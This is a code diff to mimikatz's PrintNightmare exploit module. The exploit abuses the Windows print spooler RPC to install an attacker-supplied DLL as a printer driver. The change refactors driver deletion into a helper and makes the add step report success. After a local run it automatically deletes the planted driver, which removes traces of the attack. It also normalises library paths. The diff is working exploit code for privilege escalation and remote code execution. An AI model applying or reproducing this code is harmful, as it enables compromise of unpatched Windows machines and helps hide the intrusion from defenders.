@@ -1658,7 +1658,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 			DriverInfo.pEnvironment = bIsX64 ? L"Windows x64" : L"Windows NT x86";
 			if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
 			{
-				if(kuhl_m_misc_printnightmare_normalize_library(szLibrary, &DriverInfo.pConfigFile, NULL))
+				if(kuhl_m_misc_printnightmare_normalize_library(bIsPar, szLibrary, &DriverInfo.pConfigFile, NULL))
 				{
 					szForce = kull_m_string_args_byName(argc, argv, L"useown", NULL, NULL) ? DriverInfo.pConfigFile : NULL;
 
@@ -1669,7 +1669,13 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 						{
 							if(kuhl_m_misc_printnightmare_FillStructure(&DriverInfo, bIsX64, !kull_m_string_args_byName(argc, argv, L"nodynamic", NULL, NULL), szForce, bIsPar, hSpoolHandle))
 							{
-								kuhl_m_misc_printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER);
+								if(kuhl_m_misc_printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER))
+								{
+									if(!bIsPar) // we can't remotely with normal user, use /clean with > rights
+									{
+										kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, DriverInfo.pName);
+									}
+								}
 								
 								LocalFree(DriverInfo.pDataFile);
 								LocalFree(DriverInfo.pDriverPath);
@@ -1693,7 +1699,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BOOL kuhl_m_misc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
+BOOL kuhl_m_misc_printnightmare_normalize_library(BOOL bIsPar, LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
 {
 	BOOL status = FALSE;
 	LPCWSTR szPtr;
@@ -1710,7 +1716,14 @@ BOOL kuhl_m_misc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *psz
 	}
 	else
 	{
-		status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
+		if(!bIsPar)
+		{
+			status = kull_m_file_getAbsolutePathOf(szLibrary, pszNormalizedLibrary);
+		}
+		else
+		{
+			status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
+		}
 	}
 
 	if(status)
@@ -1811,7 +1824,7 @@ BOOL kuhl_m_misc_printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64
 
 void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
 {
-	DWORD i, ret, cReturned = 0;
+	DWORD i, cReturned = 0;
 	_PDRIVER_INFO_2 pDriverInfo;
 	PWSTR pName, pConfig;
 
@@ -1828,28 +1841,7 @@ void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t
 				{
 					if(pName == wcsstr(pName, MIMIKATZ L"-"))
 					{
-						RpcTryExcept
-						{
-							if(bIsPar)
-							{
-								kprintf(L"> RpcAsyncDeletePrinterDriverEx: ");
-								ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, pName, DPD_DELETE_UNUSED_FILES, 0);
-							}
-							else
-							{
-								kprintf(L"> RpcDeletePrinterDriverEx: ");
-								ret = RpcDeletePrinterDriverEx(NULL, (wchar_t *) szEnvironment, pName, DPD_DELETE_UNUSED_FILES, 0);
-							}
-
-							if (ret == ERROR_SUCCESS)
-							{
-								kprintf(L"OK!\n");
-							}
-							else PRINT_ERROR(L"%u\n", ret);
-						}
-						RpcExcept(RPC_EXCEPTION)
-							PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-						RpcEndExcept
+						kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hRemoteBinding, szEnvironment, pName);
 					}
 				}
 			}
@@ -1858,8 +1850,9 @@ void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t
 	}
 }
 
-void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
+BOOL kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
 {
+	BOOL status = FALSE;
 	DWORD ret;
 	DRIVER_CONTAINER container_info;
 
@@ -1882,6 +1875,7 @@ void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBi
 
 		if (ret == ERROR_SUCCESS)
 		{
+			status = TRUE;
 			kprintf(L"OK!\n");
 		}
 		else PRINT_ERROR(L"%u\n", ret);
@@ -1889,6 +1883,40 @@ void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBi
 	RpcExcept(RPC_EXCEPTION)
 		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 	RpcEndExcept
+
+	return status;
+}
+
+BOOL kuhl_m_misc_printnightmare_DeletePrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, LPCWSTR pName)
+{
+	BOOL status = FALSE;
+	DWORD ret;
+
+	RpcTryExcept
+	{
+		if(bIsPar)
+		{
+			kprintf(L"> RpcAsyncDeletePrinterDriverEx: ");
+			ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, (wchar_t *) pName, DPD_DELETE_UNUSED_FILES, 0);
+		}
+		else
+		{
+			kprintf(L"> RpcDeletePrinterDriverEx: ");
+			ret = RpcDeletePrinterDriverEx(NULL, (wchar_t *) szEnvironment, (wchar_t *)pName, DPD_DELETE_UNUSED_FILES, 0);
+		}
+
+		if (ret == ERROR_SUCCESS)
+		{
+			status = TRUE;
+			kprintf(L"OK!\n");
+		}
+		else PRINT_ERROR(L"%u\n", ret);
+	}
+	RpcExcept(RPC_EXCEPTION)
+		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+	RpcEndExcept
+
+	return status;
 }
 
 BOOL kuhl_m_misc_printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
